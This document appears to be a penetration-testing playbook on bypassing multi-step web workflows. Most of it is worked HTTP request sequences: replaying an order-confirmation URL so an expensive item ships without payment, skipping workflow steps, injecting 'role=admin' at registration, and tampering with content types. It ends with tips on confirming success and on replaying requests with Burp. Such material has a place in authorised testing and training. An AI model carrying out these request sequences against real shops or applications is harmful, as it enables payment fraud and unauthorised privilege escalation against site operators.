# Workflow / State Machine Bypass

## When this applies

- Multi-step workflow (cart → payment → confirmation) where each step trusts that the previous step ran.
- Confirmation endpoint that simply checks for a flag (`?order-confirmation=true`) rather than verifying payment.
- Registration / role-assignment workflows where the final state can be set before the prior validation step completes.

## Technique

Replay or skip directly to the step that grants the benefit. Mix in content-type confusion or hidden parameter injection to bypass the validation that should gate the step.

## Steps

### Confirmation URL replay

```http
# Original confirmation after legitimate purchase
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
Cookie: session=abc123

# Replay with different cart contents
# (After adding expensive item and NOT checking out)
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
Cookie: session=abc123
# Server confirms order without payment validation!

# Variations to test
GET /cart/order-confirmation?order-confirmation=1
GET /cart/order-confirmation?order-confirmation=yes
GET /cart/order-confirmation?order-confirmation=anything
GET /cart/order-confirmation?confirmed=true
GET /cart/order-confirmation  # No parameter
```

### Step skipping payloads

```http
# Normal workflow
POST /step1 → POST /step2 → POST /step3 → GET /success

# Test these skips:
POST /step1 → GET /success  # Skip to end
POST /step1 → POST /step3 → GET /success  # Skip step 2
GET /success  # Skip all steps

# Parameter manipulation
POST /step2?skip_validation=true
POST /step2?validated=true
POST /step2?previous_step=completed
```

### Registration / role state bypass

```http
# Registration workflow
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&email=test@test.com&password=pass123

# After registration, before confirmation
POST /role/select HTTP/1.1
role=admin  # May work if state transition not validated

# Skip confirmation step
POST /register → POST /login (skip email confirmation)

# Change role during registration
POST /register HTTP/1.1
username=attacker&email=test@test.com&password=pass123&role=admin
```

### Content type tampering

```http
# Original request
POST /api/user/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker

# Try JSON
POST /api/user/update HTTP/1.1
Content-Type: application/json

{"username":"attacker","role":"admin"}

# Try XML
POST /api/user/update HTTP/1.1
Content-Type: application/xml

<user><username>attacker</username><role>admin</role></user>
```

### Concrete workflow bypass

**Legitimate Workflow:**
```http
# Step 1: Add item
POST /cart HTTP/1.1
productId=10&quantity=1

# Step 2: Checkout
POST /cart/checkout HTTP/1.1
csrf=token123

# Step 3: Payment (redirects to /pay)
GET /pay?session_id=abc123 HTTP/1.1

# Step 4: Payment confirmation
POST /pay/confirm HTTP/1.1
payment_token=xyz789

# Step 5: Order confirmation (automatic redirect)
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
```

**Exploited Workflow:**
```http
# Step 1: Complete legitimate purchase of cheap item (capture confirmation URL)

# Step 2: Add expensive item to cart WITHOUT checkout
POST /cart HTTP/1.1
productId=1&quantity=1  # Expensive jacket

# Step 3: Replay order confirmation (skip payment!)
GET /cart/order-confirmation?order-confirmation=true HTTP/1.1
Cookie: session=abc123

# Result: Order confirmed without payment validation!
```

## Verifying success

- Order is confirmed/shipped without payment being charged.
- Account flags (admin, verified, paid) are set without going through the gating step.
- Re-fetching the user profile shows the privileged state persisted server-side.

## Common pitfalls

- Some workflows require a server-side state token in the session — fetching it from a "step 1" call once may be enough.
- Browsers cache confirmation URLs — use Burp Repeater so the same URL fires twice with different cart state.
- Some apps accept content-type confusion only on specific endpoints — fuzz Content-Type per endpoint.

## Tools

- Burp Suite Repeater (replay confirmation URLs)
- Burp Suite Macro (chain steps; see gift-card-loop.md)
- curl
